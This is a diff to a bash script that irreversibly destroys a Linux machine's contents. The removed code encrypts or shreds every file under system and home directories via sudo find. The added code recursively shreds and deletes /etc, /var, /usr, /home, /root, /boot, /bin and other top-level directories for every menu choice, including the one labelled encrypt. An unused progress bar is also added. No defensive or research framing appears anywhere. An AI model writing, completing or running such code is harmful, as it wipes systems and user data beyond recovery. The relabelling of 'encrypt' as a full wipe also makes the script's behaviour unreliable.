@@ -16,6 +16,21 @@ prepare_logs() {
     chmod 600 nohup.out remaining_files.log
 }
 
+# Function to create a simple progress bar
+progress_bar() {
+    local current=$1
+    local total=$2
+    local width=50
+    local percent=$(( current * 100 / total ))
+    local filled=$(( percent * width / 100 ))
+    local empty=$(( width - filled ))
+
+    printf "\r["
+    printf "%0.s#" $(seq 1 $filled)
+    printf "%0.s-" $(seq 1 $empty)
+    printf "] %d%%" "$percent"
+}
+
 # Function to wipe using efficient shredding
 wipe_files() {
     if $SHRED_PRESENT; then
@@ -32,55 +47,25 @@ wipe_files() {
     fi
 }
 
-# Function to encrypt using available tools
-encrypt_files() {
-    if $GPG_PRESENT; then
-        echo "Using gpg on $1..."
-        timeout 10s gpg --yes --batch --passphrase "$PASSPHRASE" -c "$1"
-    else
-        echo "gpg not found, skipping encryption."
+# Function to recursively shred directories from the top
+recursive_shred() {
+    local dir=$1
+    echo "Starting shred on $dir..."
+    find "$dir" -mindepth 1 -maxdepth 1 -type d | while read -r subdir; do
+        recursive_shred "$subdir"
+    done
+
+    # Shred all files in the current directory
+    find "$dir" -type f -exec bash -c 'wipe_files "{}"' \;
+
+    # Optionally, remove the directory itself after shredding
+    if [ -z "$(find "$dir" -mindepth 1 -maxdepth 1)" ]; then
+        rm -rf "$dir"
     fi
 }
 
-# Function to process files based on user choice
-process_files() {
-    local action=$1
-    export -f "$action" # Export the function so that it is available in subshells
-    if $NOHUP_PRESENT; then
-        nohup sudo find /tmp /var/log /var/tmp /home /var/cache /opt /usr/local /var/lib \
-        /usr/bin /usr/sbin /lib /lib64 /etc /boot /bin /sbin /mnt \
-        -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -type f \
-        ! -name "$(which shred)" \
-        ! -name "$(which gpg)" \
-        ! -name "$(which bash)" \
-        ! -name "$(which sh)" \
-        ! -name "$(which find)" \
-        ! -name "$(which timeout)" \
-        ! -name "$(which nohup)" \
-        ! -name "$(which sudo)" \
-        ! -name "$(which rm)" \
-        ! -name "$(which mv)" \
-        ! -name "$(which ls)" \
-        -exec bash -c "$action \"{}\"" \; >> remaining_files.log 2>&1 &
-    else
-        echo "nohup not found, running without it..."
-        sudo find /tmp /var/log /var/tmp /home /var/cache /opt /usr/local /var/lib \
-        /usr/bin /usr/sbin /lib /lib64 /etc /boot /bin /sbin /mnt \
-        -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -type f \
-        ! -name "$(which shred)" \
-        ! -name "$(which gpg)" \
-        ! -name "$(which bash)" \
-        ! -name "$(which sh)" \
-        ! -name "$(which find)" \
-        ! -name "$(which timeout)" \
-        ! -name "$(which nohup)" \
-        ! -name "$(which sudo)" \
-        ! -name "$(which rm)" \
-        ! -name "$(which mv)" \
-        ! -name "$(which ls)" \
-        -exec bash -c "$action \"{}\"" \; >> remaining_files.log 2>&1
-    fi
-}
+# Export the function so it can be used in subshells
+export -f wipe_files recursive_shred
 
 # Function to log progress if possible
 log_progress() {
@@ -106,17 +91,25 @@ if [[ $choice =~ [EeBb] ]]; then
     echo
 fi
 
+# Set top-level directories to shred
+directories=("/etc" "/var" "/usr" "/home" "/root" "/lib" "/opt" "/mnt" "/boot" "/bin" "/sbin")
+
 # Determine the action to take based on user input
 case $choice in
     [Ee]* )
-        process_files "encrypt_files"
+        for dir in "${directories[@]}"; do
+            recursive_shred "$dir"
+        done
         ;;
     [Ww]* )
-        process_files "wipe_files"
+        for dir in "${directories[@]}"; do
+            recursive_shred "$dir"
+        done
         ;;
     [Bb]* )
-        process_files "encrypt_files"
-        process_files "wipe_files"
+        for dir in "${directories[@]}"; do
+            recursive_shred "$dir"
+        done
         ;;
     * )
         echo "Please choose (E) encrypt, (W) wipe, or (B) both."
@@ -130,4 +123,4 @@ log_progress
 # Wait for background processes to finish
 wait
 
-echo "Process complete."
+echo -e "\nProcessing complete!"
